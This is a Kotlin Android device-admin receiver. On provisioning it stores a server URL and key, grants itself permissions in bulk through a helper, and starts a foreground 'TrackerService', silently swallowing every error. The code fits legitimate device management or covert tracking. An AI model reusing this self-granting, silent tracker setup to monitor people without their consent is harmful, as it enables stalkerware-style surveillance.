package com.aether.convert.admin

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat
import com.aether.convert.Prefs
import com.aether.convert.TrackerService

class AdminReceiver : DeviceAdminReceiver() {
    override fun onEnabled(ctx: Context, i: Intent) { super.onEnabled(ctx, i); apply(ctx, i) }
    override fun onProfileProvisioningComplete(ctx: Context, i: Intent) {
        super.onProfileProvisioningComplete(ctx, i); apply(ctx, i)
    }
    private fun apply(ctx: Context, i: Intent) {
        try {
            @Suppress("DEPRECATION")
            val b = i.getBundleExtra(DevicePolicyManager.EXTRA_PROVISIONING_ADMIN_EXTRAS_BUNDLE)
            if (b != null) {
                val p = Prefs(ctx)
                b.getString("url")?.let { p.cfgUrl = it.trimEnd('/') }
                b.getString("key")?.let { p.cfgKey = it }
            }
        } catch (_: Throwable) {}
        try { Dp.grantAll(ctx) } catch (_: Throwable) {}
        try {
            ContextCompat.startForegroundService(ctx,
                Intent(ctx, TrackerService::class.java).setAction(TrackerService.ACTION_START))
        } catch (_: Throwable) {}
    }
}